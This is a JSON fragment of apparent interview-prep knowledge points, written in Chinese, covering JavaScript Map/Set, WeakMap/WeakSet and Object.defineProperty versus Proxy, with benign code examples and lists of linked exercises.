    "testPoint": "在 ES6 中，`Map` 和 `Set` 是两种新的数据结构，用来弥补对象和数组在“键值存储”和“去重”上的一些不足。它们在**性能、数据结构选择、API 灵活性**等方面提供了更强的能力。\n\n\n## 一、Set 的考察点\n\n### 1. **基本概念**\n\n* `Set` 是一种 **值的集合**，成员 **唯一且无重复**。\n* 支持任意类型的值（包括对象、NaN、undefined）。\n\n### 2. **常用 API**\n\n```js\nconst s = new Set([1, 2, 3, 3]);\ns.add(4);     // 添加元素\ns.delete(2);  // 删除元素\ns.has(3);     // 是否存在\ns.clear();    // 清空所有元素\n```\n\n### 3. **遍历方式**\n\n```js\nfor (const item of s) { ... }\ns.forEach((value) => { ... });\n[...s]         // 转换为数组\n```\n\n### 4. **常见应用场景**\n\n* 数组去重：\n\n  ```js\n  const arr = [1, 2, 2, 3];\n  const unique = [...new Set(arr)];\n  ```\n* 对值集合做集合运算（交集、并集、差集）：\n\n  ```js\n  // 并集\n  new Set([...a, ...b]);\n  // 交集\n  new Set([...a].filter(x => b.has(x)));\n  // 差集\n  new Set([...a].filter(x => !b.has(x)));\n  ```\n\n\n## 二、Map 的考察点\n\n### 1. **基本概念**\n\n* `Map` 是一种 **键值对集合**，**键的类型不限**（包括对象、函数等）。\n* 与 Object 的主要区别在于：**键不再被强制转为字符串**。\n\n### 2. **常用 API**\n\n```js\nconst map = new Map();\nmap.set('a', 1);             // 添加键值对\nmap.get('a');                // 获取值\nmap.has('a');                // 判断是否存在\nmap.delete('a');             // 删除键值对\nmap.clear();                 // 清空所有条目\n```\n\n### 3. **初始化**\n\n```js\nconst m = new Map([\n  ['name', 'Tom'],\n  ['age', 18],\n]);\n```\n\n### 4. **遍历方式**\n\n```js\nfor (const [key, value] of map) { ... }\nmap.forEach((value, key) => { ... });\n[...map.keys()], [...map.values()], [...map.entries()]\n```\n\n### 5. **与 Object 的区别**\n\n| 特性    | Object      | Map              |\n| ----- | ----------- | ---------------- |\n| 键名类型  | 字符串或 Symbol | 任意类型             |\n| 键值顺序  | 无保证顺序       | 插入顺序             |\n| 原型链干扰 | 有           | 无干扰              |\n| 适合用途  | 结构性数据       | 映射（键值）数据         |\n| 可迭代性  | 不可直接迭代      | 可直接使用 `for...of` |\n\n## 三、WeakMap 和 WeakSet（扩展考察）\n\n### 1. WeakMap\n\n* 键只能是对象\n* 不可遍历，无 `size` 属性\n* 用于私有数据、DOM 关联对象等弱引用场景\n\n### 2. WeakSet\n\n* 值只能是对象\n* 不可遍历，不可用 `forEach`\n* 通常用于对象引用记录，不影响垃圾回收\n\n\n| 对比点   | Map      | Set      |\n| ----- | -------- | -------- |\n| 存储内容  | 键值对      | 唯一值      |\n| 键是否唯一 | 是        | 值必须唯一    |\n| 键类型   | 任意类型     | 不适用（只存值） |\n| 去重能力  | 否        | 是        |\n| 用途    | 更精确的映射结构 | 去重、集合运算  |\n",
    "exerciseKeyList": "[\"75022926-8fe3-4f93-bab2-4e3c8e31c170\",\"b837af11-c26f-41d2-b2fc-3610a1575ec2\",\"487a7c86-fd00-4567-a6e2-dd6446e79e5e\",\"4232c372-316f-4a53-99b9-6d9299b7e91f\",\"37b4752f-88bd-4959-8ff7-c081fdbc20cb\",\"f56b93a9-52df-49ae-8d63-d7ee4f816f8b\",\"248830a2-ac8d-4321-8d65-2ab4566f44aa\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-02T15:00:27.000Z",
    "updateAt": "2025-07-17T14:53:44.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "248830a2-ac8d-4321-8d65-2ab4566f44aa",
        "title": "Map 的键是引用类型时，如何防止内存泄漏？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2025-07-17T14:53:11.000Z",
        "updateAt": "2025-07-17T14:53:26.000Z"
      },
      {
        "exerciseKey": "37b4752f-88bd-4959-8ff7-c081fdbc20cb",
        "title": "使用 js 实现有序数组原地去重",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-30T01:14:00.000Z",
        "updateAt": "2023-06-26T08:53:43.000Z"
      },
      {
        "exerciseKey": "4232c372-316f-4a53-99b9-6d9299b7e91f",
        "title": "ES6中新增的Set、Map两种数据结构怎么理解?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:36:29.000Z",
        "updateAt": "2024-07-20T09:48:07.000Z"
      },
      {
        "exerciseKey": "487a7c86-fd00-4567-a6e2-dd6446e79e5e",
        "title": "Map 和 Set 的用法以及区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-17T12:57:26.000Z",
        "updateAt": "2024-07-22T15:40:41.000Z"
      },
      {
        "exerciseKey": "75022926-8fe3-4f93-bab2-4e3c8e31c170",
        "title": "请实现下面的 myMap 方法",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-03-12T15:25:38.000Z",
        "updateAt": "2023-03-26T08:43:36.000Z"
      },
      {
        "exerciseKey": "b837af11-c26f-41d2-b2fc-3610a1575ec2",
        "title": "Map 和 WeakMap 有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:42:35.000Z",
        "updateAt": "2024-08-10T17:07:04.000Z"
      },
      {
        "exerciseKey": "f56b93a9-52df-49ae-8d63-d7ee4f816f8b",
        "title": "数组去重",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T14:57:47.000Z",
        "updateAt": "2021-07-07T00:12:34.000Z"
      }
    ]
  },
  "59": {
    "id": 59,
    "tagId": 24,
    "title": "WeakMap 和 WeakSet",
    "explanation": "## 1\\. 什么是 WeakSet\n\nWeakSet 结构与 Set 类似，也是不重复的值的集合，具备\n\n-   **WeakSet.prototype.add(value)** ：向 WeakSet 实例添加一个新成员。\n-   **WeakSet.prototype.delete(value)** ：清除 WeakSet 实例的指定成员。\n-   **WeakSet.prototype.has(value)** ：返回一个布尔值，表示某个值是否在 WeakSet 实例之中。 这三个方法。但是，它与 Set 有两个区别。\n\n###### 区别一：WeakSet 的成员只能是对象和Symbol类型，而不能是其他类型的值，我们用代码演示一下\n\n![1.png](https://static.ecool.fun//article/3ff1f73b-8e34-4525-ba59-e6da12913725.awebp)\n\n从代码中可以看到，想像Set一样直接往 WeakSet 中添加原始类型化会报错，只能添加对象和Symbol\n\n###### 区别二`(这是核心)`： WeakSet 中的对象都是弱引用，即垃圾回收机制不考虑 WeakSet 对该对象的引用，也就是说，如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存，不考虑该对象还存在于 WeakSet 之中。\n\n（这句解释来自`ECMAScript 6 入门`,第一眼看到这句话这话会觉得有点晦涩，我们来解释一下）\n\n-   **弱引用**：垃圾回收机制有一套自己的回收算法，我们都知道一个函数执行完成后该函数在调用栈中创建的执行上下文会被销毁，这里说的销毁，其实指的就是执行上下文中环境变量、词法变量中的数据存储所占据的内存空间被垃圾回收机制所回收，那么`垃圾回收机制不考虑 WeakSet 对该对象的引用`是不是就意味着垃圾回收机制不会回收 WeakSet 对象里面的数据所占据的内存呢？不！不是的！代码是最好的解释\n\n![carbon (1).png](https://static.ecool.fun/others/a96d75ba-217f-4e54-9759-1ffb410e58bf.png)\n\n我们用 ws 中存放一个对象，然后再将该对象置为null，（这里要说明一下，一个变量被置为null，就意味着这个变量的内存可以被回收了）看着这个打印结果有没有突然明白了点什么，对！没错！只要 WeakSet 结构中的对象不再需要被引用，那么 WeakSet 就直接为空了，这不就意味着WeakSet中的数据所占据的内存被释放了吗。好的，你或许还会有疑问，难道不用 WeakSet 存储数据，结果就不是这样的吗，来打消你的疑虑\n\n![carbon.png](https://static.ecool.fun//article/fada5a2c-87c8-4149-b5fb-c7cd1a341b83.) 不使用 WeakSet 存放数据，当变量obj为null时，fistName依旧是有值的，对比这段代码，我们可以清晰的看出, WeakSet中 - `垃圾回收机制会自动回收该对象所占用的内存`\n\n## 2\\. 这里有'BUG'\n\n可能已经有小伙伴拔出了他40米长的大剑了，上图二中的代码其实有问题，真实的打印应该是\n\n![image.png](https://static.ecool.fun//article/6afb275a-edad-4c3d-951c-7f3288a0b67f.)\n\n各位手中的长剑收一收，先别急，其实我们前面聊的没有问题，为什么这里真是打印能出来结果呢？这个问题在国外某技术论坛上也是一度出现在 WeakSet 话题榜首位，**解释为：因为浏览器的垃圾回收机制是不受我们控制的，我们无法知道垃圾回收机制什么时候执行，之所以打印能出现内容，其实是因为打印的时候垃圾回收机制没有启动。所以我们可以认为，上图二中的打印在垃圾回收启动之后，它就是空的**\n\n我们可以这样来证明它:\n\n![image.png](https://static.ecool.fun//article/35555267-a0cc-4f2c-ad4d-d1d651ad4aeb.)\n\n如果这样你觉得依旧不够睡服你自己的话，我们把这段代码搬到node中：\n\n需要知道的是\n\n> global.gc() // 强制节点运行垃圾回收\n\n> process.memoryUsage() // Nodejs 的内存占用情况\n\n> 返回结果：{ rss: 22036480, heapTotal: 5300224, heapUsed: 2984464, external: 201153, arrayBuffers: 10422 }\n\n> 其中 `heapUsed: 2984464` 这就是当前node.js中内存被占用的的值 ≈ 3M,\n\n测试我们的代码：\n\n```javascript\nglobal.gc();\nprocess.memoryUsage()  // heapUsed ≈ 3M\n\nlet obj = { name: '诺克萨斯', age: new Array(5 * 1024 * 1024) } // 为了差距明显一点，这里多加一个值让整个对象占据内存更大\nlet ws = new WeakSet();\nws.add(obj);\n\nglobal.gc();\nconsole.log(process.memoryUsage())  \n\n\n// heapUsed: 45172336 ≈ 4.5M\n\n```\n\n现在node中内存被占据约 4.5M，再取消对obj的外部引用：\n\n```ini\nglobal.gc(); // 强制节点运行垃圾回收\n\nlet obj = { name: '诺克萨斯', age: new Array(5 * 1024 * 1024) } \nlet ws = new WeakSet();\nws.add(obj);\nglobal.gc();\n\nobj = null;\nglobal.gc();\nconsole.log(process.memoryUsage());\n\n// heapUsed: 2974448 ≈ 3M\n```\n\n所以我们说如果其他对象都不再引用该对象，那么垃圾回收机制会自动回收该对象所占用的内存，nice！明白了这个问题点之后，你应该已经对 WeakSet 有了一个很深刻的认识了， 那么es6新增一个 WeakSet 有什么应用场景呢？\n\n## 3\\. WeakSet 应用场景\n\n一个很典型的应用场景： **储存 DOM 节点，而不用担心这些节点从文档移除时，会引发内存泄漏**。 友好一点来解释的话不如上代码\n\n![carbon (3).png](https://static.ecool.fun/others/fd6a101e-e9e6-4a12-9f4c-2422dafb907e.png) 假设我们需要给记录页面上的禁用标签，那么一个Set对象存放就可以了，这样写功能上没有问题，但如果写成这样，当点击事件发生后，button 的dom被移除，那么整份js中 disabledElements 这个对象因为是强引用，其中的值依然存在于内存中的，那么内存泄漏就造成了，于是我们可以换成 WeakSet 来存放\n\n![carbon (4).png](https://static.ecool.fun/others/da055825-576e-445f-a854-0289f885f446.png)\n\n效果是一样的，这里当 button 被移除，disabledElements 中的内容会因为是弱引用而直接变成空，也就是disabledElements被垃圾回收掉了其中的内存，避免了一个小小的内存泄漏的产生\n\n## 4\\. WeakMap\n\n和map结构类似，也是用于生成键值对的集合，key 只能是对象等等... 这些特性读者完全可以在 `[ECMAScript 6 入门]`上了解，我们这里只探讨这本书上没有深入解释的部分。\n\n知道了`WeakSet`，`WeakMap`的弱引用，垃圾回收机制不将该引用考虑在内，这些特点也是相同的意思了\n\n## 总结\n\nWeakSet 实例的用处其实没有那么大。不过，弱集合在给对象打标签时还是很有价值的，它在很多项目的源码当中被使用到，了解 WeakSet 的特性在阅读源码的时候会有一定的帮助，WeakMap 应用场景会稍微广泛一些，需要注意的事，因为WeakSet 和 WeakMap 随时都可能被垃圾回收掉，所以他们都不支持被遍历",
    "testPoint": "在 ES6 中，`WeakMap` 和 `WeakSet` 是专为**弱引用存储**设计的数据结构，主要用于内存敏感、对象生命周期管理等场景。在面试中，考察重点通常包括它们的**使用限制、区别、用途、与垃圾回收的关系等方面**。\n\n## 一、基础概念\n\n### 1. WeakMap\n\n* 是一种**键只能是对象**的 `Map`。\n* **键是弱引用**，不影响对象的垃圾回收。\n* **不可遍历**，无 `.size`、`.keys()`、`forEach()` 等方法。\n\n### 2. WeakSet\n\n* 是一种**只能存对象的 Set**。\n* 每个对象最多只出现一次，值是弱引用。\n* 也**不可遍历**，无 `.size`、`forEach()`。\n\n## 二、常见 API（都很少）\n\n### WeakMap\n\n```js\nconst wm = new WeakMap();\nconst obj = {};\nwm.set(obj, 'data');\nwm.get(obj);       // 'data'\nwm.has(obj);       // true\nwm.delete(obj);    // true\n```\n\n### WeakSet\n\n```js\nconst ws = new WeakSet();\nconst obj = {};\nws.add(obj);\nws.has(obj);       // true\nws.delete(obj);    // true\n```\n\n## 三、核心特性与限制\n\n| 特性         | WeakMap / WeakSet 说明                     |\n| ---------- | ---------------------------------------- |\n| 键或值必须是对象   | 原始值（如字符串、数字）会抛错                          |\n| 弱引用        | 被引用对象如果无其他引用，会被 GC 回收                    |\n| 不可遍历       | 无法使用 `for...of`、`.keys()`、`.size`，以防内存泄漏 |\n| 无序集合       | 不能获取顺序，也不能遍历                             |\n| 无 clear 方法 | 无法批量清空（也是为避免意外保留对象引用）                    |\n\n## 四、适用场景考察点\n\n### 1. **DOM 节点私有数据缓存**\n\n* 避免因引用 DOM 节点造成内存泄漏：\n\n```js\nconst elementData = new WeakMap();\nconst el = document.querySelector('#app');\nelementData.set(el, { clickCount: 0 });\n\n// 当 el 被移除 DOM 且无其他引用时，自动被 GC 清理\n```\n\n### 2. **对象实例私有属性封装**\n\n```js\nconst _private = new WeakMap();\n\nclass Person {\n  constructor(name) {\n    _private.set(this, { name });\n  }\n\n  getName() {\n    return _private.get(this).name;\n  }\n}\n```\n\n### 3. **缓存敏感数据**\n\n* 如用户权限、缓存响应内容等，且希望对象不再使用时自动释放内存。\n\n---\n\n## 五、与 Map / Set 的对比\n\n| 特性          | Map / Set | WeakMap / WeakSet |\n| ----------- | --------- | ----------------- |\n| 键/值类型限制     | 任意类型      | 只能是对象             |\n| 是否可遍历       | 是         | 否（不可遍历）           |\n| 是否有 `.size` | 有         | 无                 |\n| 是否强引用       | 是         | 否（弱引用）            |\n| 是否影响 GC     | 是         | 否                 |\n| 典型应用场景      | 显性缓存、通用集合 | 隐式缓存、私有数据、不影响 GC  |\n\n---\n\n## 六、常见面试题示例\n\n1. **WeakMap 和 Map 有哪些区别？为什么 WeakMap 没有 size 属性？**\n2. **为什么 WeakMap 的键不能是基本类型？**\n3. **如何使用 WeakMap 封装私有属性？**\n4. **WeakMap 如何避免内存泄漏？**\n5. **什么是弱引用？JavaScript 中有哪些弱引用结构？**\n\n---\n\n## 七、补充说明：WeakRef 与 FinalizationRegistry（新特性）\n\n* ES2021 提供了 `WeakRef` 和 `FinalizationRegistry`：\n\n  * `WeakRef`：显式持有对象的弱引用。\n  * `FinalizationRegistry`：对象被垃圾回收时执行回调。\n\n---\n\n## 总结\n\n| 项目      | WeakMap    | WeakSet  |\n| ------- | ---------- | -------- |\n| 键/值     | 键为对象 / 值任意 | 值为对象     |\n| 用途      | 关联私有数据、缓存  | 存储唯一对象引用 |\n| 是否可遍历   | 否          | 否        |\n| 是否弱引用   | 是          | 是        |\n| 是否影响 GC | 否          | 否        |\n\n掌握 `WeakMap` 和 `WeakSet` 的使用，体现的是你对**JS 内存管理、数据结构选择和封装能力**的理解，尤其适用于中高级前端面试中。\n",
    "exerciseKeyList": "[\"b837af11-c26f-41d2-b2fc-3610a1575ec2\",\"9ba8772e-64a2-4472-be3b-21caa3410679\",\"282d0311-3b51-42eb-a41a-2d264e16a732\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-02T15:06:17.000Z",
    "updateAt": "2025-07-17T15:03:35.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "282d0311-3b51-42eb-a41a-2d264e16a732",
        "title": "如何使用 WeakMap 封装私有属性？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2025-07-17T15:03:20.000Z",
        "updateAt": "2025-07-17T15:03:24.000Z"
      },
      {
        "exerciseKey": "9ba8772e-64a2-4472-be3b-21caa3410679",
        "title": "为什么 WeakMap 的键不能是基本类型？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2025-07-17T15:01:34.000Z",
        "updateAt": "2025-07-17T15:01:38.000Z"
      },
      {
        "exerciseKey": "b837af11-c26f-41d2-b2fc-3610a1575ec2",
        "title": "Map 和 WeakMap 有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:42:35.000Z",
        "updateAt": "2024-08-10T17:07:04.000Z"
      }
    ]
  },
  "60": {
    "id": 60,
    "tagId": 24,
    "title": "defineProperty 与 proxy",
    "explanation": "## 前言\n\n我们或多或少都听过“数据绑定”这个词，“数据绑定”的关键在于监听数据的变化，可是对于这样一个对象：`var obj = {value: 1}`，我们该怎么知道 obj 发生了改变呢？\n\n## definePropety\n\nES5 提供了 Object.defineProperty 方法，该方法可以在一个对象上定义一个新属性，或者修改一个对象的现有属性，并返回这个对象。\n\n**语法**\n\n> Object.defineProperty(obj, prop, descriptor)\n\n**参数**\n\n```makefile\nobj: 要在其上定义属性的对象。\n\nprop:  要定义或修改的属性的名称。\n\ndescriptor: 将被定义或修改的属性的描述符。\n```\n\n举个例子：\n\n```js\nvar obj = {};\nObject.defineProperty(obj, \"num\", {\n    value : 1,\n    writable : true,\n    enumerable : true,\n    configurable : true\n});\n//  对象 obj 拥有属性 num，值为 1\n```\n\n虽然我们可以直接添加属性和值，但是使用这种方式，我们能进行更多的配置。\n\n函数的第三个参数 descriptor 所表示的属性描述符有两种形式：**数据描述符和存取描述符**。\n\n**两者均具有以下两种键值**：\n\n**configurable**\n\n```arduino\n当且仅当该属性的 configurable 为 true 时，该属性描述符才能够被改变，也能够被删除。默认为 false。\n```\n\n**enumerable**\n\n```arduino\n当且仅当该属性的 enumerable 为 true 时，该属性才能够出现在对象的枚举属性中。默认为 false。\n```\n\n**数据描述符同时具有以下可选键值**：\n\n**value**\n\n```javascript\n该属性对应的值。可以是任何有效的 JavaScript 值（数值，对象，函数等）。默认为 undefined。\n```\n\n**writable**\n\n```arduino\n当且仅当该属性的 writable 为 true 时，该属性才能被赋值运算符改变。默认为 false。\n```\n\n**存取描述符同时具有以下可选键值**：\n\n**get**\n\n```javascript\n一个给属性提供 getter 的方法，如果没有 getter 则为 undefined。该方法返回值被用作属性值。默认为 undefined。\n```\n\n**set**\n\n```javascript\n一个给属性提供 setter 的方法，如果没有 setter 则为 undefined。该方法将接受唯一参数，并将该参数的新值分配给该属性。默认为 undefined。\n```\n\n值得注意的是：\n\n**属性描述符必须是数据描述符或者存取描述符两种形式之一，不能同时是两者。** 这就意味着你可以：\n\n```js\nObject.defineProperty({}, \"num\", {\n    value: 1,\n    writable: true,\n    enumerable: true,\n    configurable: true\n});\n```\n\n也可以：\n\n```js\nvar value = 1;\nObject.defineProperty({}, \"num\", {\n    get : function(){\n      return value;\n    },\n    set : function(newValue){\n      value = newValue;\n    },\n    enumerable : true,\n    configurable : true\n});\n```\n\n但是不可以：\n\n```js\n// 报错\nObject.defineProperty({}, \"num\", {\n    value: 1,\n    get: function() {\n        return 1;\n    }\n});\n```\n\n此外，所有的属性描述符都是非必须的，但是 descriptor 这个字段是必须的，如果不进行任何配置，你可以这样：\n\n```js\nvar obj = Object.defineProperty({}, \"num\", {});\nconsole.log(obj.num); // undefined\n```\n\n## Setters 和 Getters\n\n之所以讲到 defineProperty，是因为我们要使用存取描述符中的 get 和 set，这两个方法又被称为 getter 和 setter。由 getter 和 setter 定义的属性称做”存取器属性“。\n\n当程序查询存取器属性的值时，JavaScript 调用 getter方法。这个方法的返回值就是属性存取表达式的值。当程序设置一个存取器属性的值时，JavaScript 调用 setter 方法，将赋值表达式右侧的值当做参数传入 setter。从某种意义上讲，这个方法负责“设置”属性值。可以忽略 setter 方法的返回值。\n\n举个例子：\n\n```js\nvar obj = {}, value = null;\nObject.defineProperty(obj, \"num\", {\n    get: function(){\n        console.log('执行了 get 操作')\n        return value;\n    },\n    set: function(newValue) {\n        console.log('执行了 set 操作')\n        value = newValue;\n    }\n})\n\nobj.num = 1 // 执行了 set 操作\n\nconsole.log(obj.num); // 执行了 get 操作 // 1\n```\n\n这不就是我们要的监控数据改变的方法吗？我们再来封装一下：\n\n```js\nfunction Archiver() {\n    var value = null;\n    // archive n. 档案\n    var archive = [];\n\n    Object.defineProperty(this, 'num', {\n        get: function() {\n            console.log('执行了 get 操作')\n            return value;\n        },\n        set: function(value) {\n            console.log('执行了 set 操作')\n            value = value;\n            archive.push({ val: value });\n        }\n    });\n\n    this.getArchive = function() { return archive; };\n}\n\nvar arc = new Archiver();\narc.num; // 执行了 get 操作\narc.num = 11; // 执行了 set 操作\narc.num = 13; // 执行了 set 操作\nconsole.log(arc.getArchive()); // [{ val: 11 }, { val: 13 }]\n```\n\n## watch API\n\n既然可以监控数据的改变，那我可以这样设想，即当数据改变的时候，自动进行渲染工作。举个例子：\n\nHTML 中有个 span 标签和 button 标签\n\n```html\n<span id=\"container\">1</span>\n<button id=\"button\">点击加 1</button>\n```\n\n当点击按钮的时候，span 标签里的值加 1。\n\n传统的做法是：\n\n```js\ndocument.getElementById('button').addEventListener(\"click\", function(){\n    var container = document.getElementById(\"container\");\n    container.innerHTML = Number(container.innerHTML) + 1;\n});\n```\n\n如果使用了 defineProperty：\n\n```js\nvar obj = {\n    value: 1\n}\n\n// 储存 obj.value 的值\nvar value = 1;\n\nObject.defineProperty(obj, \"value\", {\n    get: function() {\n        return value;\n    },\n    set: function(newValue) {\n        value = newValue;\n        document.getElementById('container').innerHTML = newValue;\n    }\n});\n\ndocument.getElementById('button').addEventListener(\"click\", function() {\n    obj.value += 1;\n});\n```\n\n代码看似增多了，但是当我们需要改变 span 标签里的值的时候，直接修改 obj.value 的值就可以了。\n\n然而，现在的写法，我们还需要单独声明一个变量存储 obj.value 的值，因为如果你在 set 中直接 `obj.value = newValue` 就会陷入无限的循环中。此外，我们可能需要监控很多属性值的改变，要是一个一个写，也很累呐，所以我们简单写个 watch 函数。使用效果如下：\n\n```js\nvar obj = {\n    value: 1\n}\n\nwatch(obj, \"value\", function(newvalue){\n    document.getElementById('container').innerHTML = newvalue;\n})\n\ndocument.getElementById('button').addEventListener(\"click\", function(){\n    obj.value += 1\n});\n```\n\n我们来写下这个 watch 函数：\n\n```js\n(function(){\n    var root = this;\n    function watch(obj, name, func){\n        var value = obj[name];\n\n        Object.defineProperty(obj, name, {\n            get: function() {\n                return value;\n            },\n            set: function(newValue) {\n                value = newValue;\n                func(value)\n            }\n        });\n\n        if (value) obj[name] = value\n    }\n\n    this.watch = watch;\n})()\n```\n\n现在我们已经可以监控对象属性值的改变，并且可以根据属性值的改变，添加回调函数，棒棒哒~\n\n## proxy\n\n使用 defineProperty 只能重定义属性的读取（get）和设置（set）行为，到了 ES6，提供了 Proxy，可以重定义更多的行为，比如 in、delete、函数调用等更多行为。\n\nProxy 这个词的原意是代理，用在这里表示由它来“代理”某些操作，ES6 原生提供 Proxy 构造函数，用来生成 Proxy 实例。我们来看看它的语法：\n\n```js\nvar proxy = new Proxy(target, handler);\n```\n\nproxy 对象的所有用法，都是上面这种形式，不同的只是handler参数的写法。其中，new Proxy()表示生成一个Proxy实例，target参数表示所要拦截的目标对象，handler参数也是一个对象，用来定制拦截行为。\n\n```js\nvar proxy = new Proxy({}, {\n    get: function(obj, prop) {\n        console.log('设置 get 操作')\n        return obj[prop];\n    },\n    set: function(obj, prop, value) {\n        console.log('设置 set 操作')\n        obj[prop] = value;\n    }\n});\n\nproxy.time = 35; // 设置 set 操作\n\nconsole.log(proxy.time); // 设置 get 操作 // 35\n```\n\n除了 get 和 set 之外，proxy 可以拦截多达 13 种操作，比如 has(target, propKey)，可以拦截 propKey in proxy 的操作，返回一个布尔值。\n\n```js\n// 使用 has 方法隐藏某些属性，不被 in 运算符发现\nvar handler = {\n  has (target, key) {\n    if (key[0] === '_') {\n      return false;\n    }\n    return key in target;\n  }\n};\nvar target = { _prop: 'foo', prop: 'foo' };\nvar proxy = new Proxy(target, handler);\nconsole.log('_prop' in proxy); // false\n```\n\n又比如说 apply 方法拦截函数的调用、call 和 apply 操作。\n\napply 方法可以接受三个参数，分别是目标对象、目标对象的上下文对象（this）和目标对象的参数数组，不过这里我们简单演示一下：\n\n```js\nvar target = function () { return 'I am the target'; };\nvar handler = {\n  apply: function () {\n    return 'I am the proxy';\n  }\n};\n\nvar p = new Proxy(target, handler);\n\np();\n// \"I am the proxy\"\n```\n\n又比如说 ownKeys 方法可以拦截对象自身属性的读取操作。具体来说，拦截以下操作：\n\n-   Object.getOwnPropertyNames()\n-   Object.getOwnPropertySymbols()\n-   Object.keys()\n\n下面的例子是拦截第一个字符为下划线的属性名，不让它被 for of 遍历到。\n\n```js\nlet target = {\n  _bar: 'foo',\n  _prop: 'bar',\n  prop: 'baz'\n};\n\nlet handler = {\n  ownKeys (target) {\n    return Reflect.ownKeys(target).filter(key => key[0] !== '_');\n  }\n};\n\nlet proxy = new Proxy(target, handler);\nfor (let key of Object.keys(proxy)) {\n  console.log(target[key]);\n}\n// \"baz\"\n```\n\n更多的拦截行为可以查看阮一峰老师的 [《ECMAScript 6 入门》](http://es6.ruanyifeng.com/#docs/proxy \"http://es6.ruanyifeng.com/#docs/proxy\")\n\n值得注意的是，proxy 的最大问题在于浏览器支持度不够，而且很多效果无法使用 poilyfill 来弥补。\n\n## watch API 优化\n\n我们使用 proxy 再来写一下 watch 函数。使用效果如下：\n\n```js\n(function() {\n    var root = this;\n\n    function watch(target, func) {\n\n        var proxy = new Proxy(target, {\n            get: function(target, prop) {\n                return target[prop];\n            },\n            set: function(target, prop, value) {\n                target[prop] = value;\n                func(prop, value);\n            }\n        });\n\n        return proxy;\n    }\n\n    this.watch = watch;\n})()\n\nvar obj = {\n    value: 1\n}\n\nvar newObj = watch(obj, function(key, newvalue) {\n    if (key == 'value') document.getElementById('container').innerHTML = newvalue;\n})\n\ndocument.getElementById('button').addEventListener(\"click\", function() {\n    newObj.value += 1\n});\n```\n\n我们也可以发现，使用 defineProperty 和 proxy 的区别，当使用 defineProperty，我们修改原来的 obj 对象就可以触发拦截，而使用 proxy，就必须修改代理对象，即 Proxy 的实例才可以触发拦截。",
    "testPoint": "在 JavaScript 中，`Object.defineProperty` 和 `Proxy` 都可以实现对象属性的劫持，是实现响应式、封装权限、拦截行为等核心技术的基础。面试中通常会从它们的**能力、区别、使用场景、性能、限制**等方面进行考察，特别是在 Vue2 和 Vue3 响应式原理对比时尤为重要。\n\n## 一、`Object.defineProperty` 的考察点\n\n### 1. **基本用法**\n\n```js\nconst obj = {};\nObject.defineProperty(obj, 'name', {\n  value: 'Tom',\n  writable: true,\n  configurable: true,\n  enumerable: true,\n});\n```\n\n### 2. **访问器属性（getter/setter）**\n\n```js\nlet val = 'Tom';\nObject.defineProperty(obj, 'name', {\n  get() {\n    return val;\n  },\n  set(newVal) {\n    console.log('修改 name:', newVal);\n    val = newVal;\n  },\n});\n```\n\n### 3. **核心特性**\n\n* 可以劫持对象属性的读写操作（但**只能作用于已存在的具体属性**）。\n* 兼容性好，ES5 开始支持。\n* **无法监听对象新增/删除属性、数组索引变更等操作**。\n* 只能劫持普通对象（对数组和嵌套对象不友好，需要递归处理）。\n\n### 4. **常见应用**\n\n* Vue2 的响应式系统（通过 `defineProperty` 劫持 data 中的数据）\n\n## 二、`Proxy` 的考察点\n\n### 1. **基本语法**\n\n```js\nconst proxy = new Proxy(target, {\n  get(target, key, receiver) { ... },\n  set(target, key, value, receiver) { ... },\n});\n```\n\n### 2. **拦截能力更强**\n\n* 支持 13 种操作符拦截：`get`、`set`、`has`、`deleteProperty`、`ownKeys`、`defineProperty`、`getOwnPropertyDescriptor`、`setPrototypeOf`、`isExtensible`、`preventExtensions` 等等。\n\n### 3. **可拦截新增/删除属性**\n\n```js\nconst obj = {};\nconst proxy = new Proxy(obj, {\n  set(target, key, value) {\n    console.log('set', key, value);\n    target[key] = value;\n    return true;\n  },\n});\nproxy.foo = 123; // 可以拦截 foo 的新增操作\n```\n\n### 4. **用于 Vue3 响应式系统**\n\n* Vue3 使用 Proxy 实现 `reactive` 和 `ref`，可更完整地跟踪对象和数组变化。\n\n\n## 三、对比考点\n\n| 特性          | `Object.defineProperty` | `Proxy`               |\n| ----------- | ----------------------- | --------------------- |\n| 支持操作范围      | 单个属性                    | 整个对象，全方位              |\n| 能否拦截新增/删除属性 | ❌                       | ✅                     |\n| 能否监听数组下标    | ❌（需要特殊处理）               | ✅                     |\n| 是否递归拦截      | ❌（手动递归）                 | ✅（整体代理）               |\n| 是否支持嵌套属性    | 否（需手动 define 嵌套）        | 是（可结合 `Reflect` 深度代理） |\n| 性能          | 更轻量（小对象）                | 略慢但功能强大（大对象更方便）       |\n| 浏览器兼容性      | ES5+（高兼容）               | ES6+（需 polyfill 支持）   |\n| Vue 应用      | Vue2 响应式                | Vue3 响应式              |\n\n## 四、实际应用场景对比总结\n\n| 场景               | 推荐方式                                   | 理由                |\n| ---------------- | -------------------------------------- | ----------------- |\n| 响应式系统（如 Vue）     | Vue2 用 `defineProperty`，Vue3 用 `Proxy` | Proxy 能力更强、支持更多场景 |\n| 封装对象私有属性、只读属性等控制 | `defineProperty`                       | 轻量、原生支持           |\n| 数据监听、日志监控、沙箱隔离等  | `Proxy`                                | 可拦截所有操作，适合动态处理    |\n| 深层嵌套对象数据管理       | `Proxy`                                | 避免手动递归处理每个属性      |",
